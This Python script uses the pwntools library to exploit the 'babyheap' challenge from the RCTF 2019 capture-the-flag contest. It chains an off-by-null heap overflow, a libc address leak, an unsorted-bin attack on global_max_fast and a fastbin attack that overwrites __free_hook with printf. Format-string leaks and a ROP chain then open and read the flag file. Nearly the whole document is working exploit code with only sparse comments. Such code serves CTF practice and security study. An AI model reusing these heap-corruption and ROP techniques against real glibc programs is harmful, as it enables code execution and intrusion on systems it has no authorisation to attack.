#!//usr/bin/python
#-*- coding:utf-8-*-
from pwn import *
context.binary = ELF("./rctf_2019_babyheap")
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0xc21')
	raw_input()

def menu(ch):
	p.sendlineafter('Choice:', str(ch))

def add(size):
	menu(1)
	p.sendlineafter('Size:', str(size))
	print "add a chunk!"

def free(idx):
	menu(3)
	p.sendlineafter('Index: ', str(idx))


def edit(idx, content):
	menu(2)
	p.sendlineafter('Index: ', str(idx))
	p.sendafter('Content: ', content)
	print "edit %d chunk !" % idx

def show(idx):
	menu(4)
	p.sendlineafter('Index: ', str(idx))

def exploit():

	#null off one leak libc
	# with unsorted bin only
	#where fastbin is banned
	add(0x18)
	add(0x508)
	add(0x18)
	edit(1, 'a'*0x4f0 + p64(0x500))			#fake pre_size
	add(0x18)
	add(0x508)
	add(0x18)
	edit(4, 'a'*0x4f0 + p64(0x500)) 		#fake pre_size
	add(0x18)     
	free(1)
	edit(0,'b'*0x18)						#fake unsorted bin's size to 0x500, which is same as fake pre_size
	add(0x18)     							
	add(0x4d8)   							#7 , within address with 1
	free(1)
	free(2)  
	add(0x18)

	show(7)
	leak = u64(p.recv(6).ljust(8, '\x00'))
	libc_base = leak  - 0x3c4b78
	print "libc_base ==> " , hex(libc_base)
	libc_addr = libc_base
	__free_hook = libc_base + libc.symbols['__free_hook']
	printf = libc_base + libc.symbols['printf']
	#fastbin restart by unsorted bin arttack
	max_fast = libc_base + 0x3c67f8

	free(1)
	add(0x38)
	edit(7,p64(0)*3+p64(0x4f1)+"aaaaaaaa"+p64(max_fast - 16))		#modify unsorted bin bk
	add(0x4e8)														#trigger attack

	free(0)											#fastbin
	edit(1,p64(0)*3+p64(0x71))						#modify 7's size
	edit(2,p64(0)*9+p64(0x21)+p64(0)*3+p64(0x21))
	free(7)											#into fastbin

	#fastbin attack, modify fd to __free_hook
	edit(1, p64(0)*3 + p64(0x71) + p64(__free_hook - 0x1090 + 5 -8))
	add(0x68)
	add(0x68)

	edit(7, '\x00'*3 + p64(0)*8 +  p64(0x551))				#fake a size 0x71
	edit(1,p64(0)*3 + p64(0x551))								#fake
	edit(4,p64(0)*3 + p64(0x30))
	free(0)

	edit(1,p64(0)*3 + p64(0x551)+p64(__free_hook - 0x1090 + 5 -8 + 0x4b))
	add(0x548)
	add(0x548)

	edit(8,p64(0)*(0x53*2) + p64(0) + p64(0x551))
	edit(1,p64(0)*3+p64(0x551))
	edit(4,p64(0)*3+p64(0x20))
	free(0)

	edit(1,p64(0)*3+p64(0x551)+p64(__free_hook - 0x1090 + 5 -8 + 0x4b + 0x540) )
	add(0x548)
	add(0x548)
	edit(9,p64(0)*(0x53*2)+p64(0)+p64(0x551))
	edit(1,p64(0)*3+p64(0x551))
	edit(4,p64(0)*3+p64(0x20))
	free(0)

	edit(1,p64(0)*3+p64(0x551)+p64(__free_hook - 0x1090 + 5 -8 + 0x4b + 0x540 + 0x540))
	add(0x548)
	add(0x548)

	edit(10,p64(0)*(0x53*2)+p64(0)+p64(0x601))
	edit(1,p64(0)*3+p64(0x601))
	edit(4,p64(0)*25+p64(0x20))
	free(0)

	edit(1,p64(0)*3+p64(0x601)+p64(__free_hook - 0x1090 + 5 -8 + 0x4b + 0x540 + 0x540 + 0x540))
	add(0x5f8)
	add(0x5f8)

	#dbg()
	edit(11, '\x00'*0x78 + p64(printf) + "\x00"*72+p64(0x1000))

	edit(8,"%7$llx %8$llx %9$llx %15$llx")
	free(8)
	
	s=p.recvuntil("D")[:-1]
	addrs=s.split(" ")
	exec_addr=int(addrs[3],16)-0x55b2ee49e2c2+0x55b2ee49d000
	stack_addr=int(addrs[1],16)
	print hex(exec_addr)
	print hex(stack_addr)
	edit(6,"%65c%48$n%48$llx")
	free(6)
	edit(11,"\x00"*0x78+p64(0))
	edit(1,p64(0)*3+p64(0x41))
	edit(2,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21))
	#gdb.attach(p)
	free(0)
	edit(1,p64(0)*3+p64(0x41)+p64(stack_addr+0x7ffd8412fc00-0x7ffd8412faf0))
	add(0x31)
	add(0x31)
	edit(6,p64(exec_addr+0x202112))
	edit(11,"\x00"*0x78+p64(libc_addr+0x55800))
	edit(3,"%50$s")
	free(3)
	k=p.recvuntil("D")[:-1]
	map_addr=u16(k)*0x10000
	print hex(map_addr)
	edit(11,"\x00"*0x78+p64(0))
	edit(1,p64(0)*3+p64(0x31))
	edit(2,p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
	free(0)
	edit(1,p64(0)*3+p64(0x31)+p64(map_addr+0x60))
	add(0x28)
	add(0x28)


	open_addr=libc_addr+0xf7030
	read_addr=libc_addr+0xf7250
	write_addr=libc_addr+0xf72b0
	edit(3,p64(stack_addr-0x7ffdcce76b80+0x7ffdcce76ba8)+p64(0x100)+"./flag\x00")
	magic_code=p64(exec_addr+0x1433)+p64(map_addr+0x80)+p64(exec_addr+0x1431)+p64(0)+p64(0)+p64(open_addr)
	magic_code+=p64(exec_addr+0x1433)+p64(3)+p64(exec_addr+0x1431)+p64(map_addr+0x70)+p64(0)+p64(libc_addr+0x101ffc)+p64(40)+p64(0)+p64(read_addr)
	magic_code+=p64(exec_addr+0x1329)#p64(exec_addr+0x1433)+p64(0)+p64(exec_addr+0x1431)+p64(map_addr)+p64(0)+p64(libc_addr+0x101ffc)+p64(20)+p64(0)+p64(write_addr)
	edit(7,magic_code)
	p.sendlineafter("Index: ","3")


	p.interactive()
	p.close()

if __name__ == '__main__':
	p = process("./rctf_2019_babyheap")
	#p = remote('node3.buuoj.cn', 29524)
	exploit()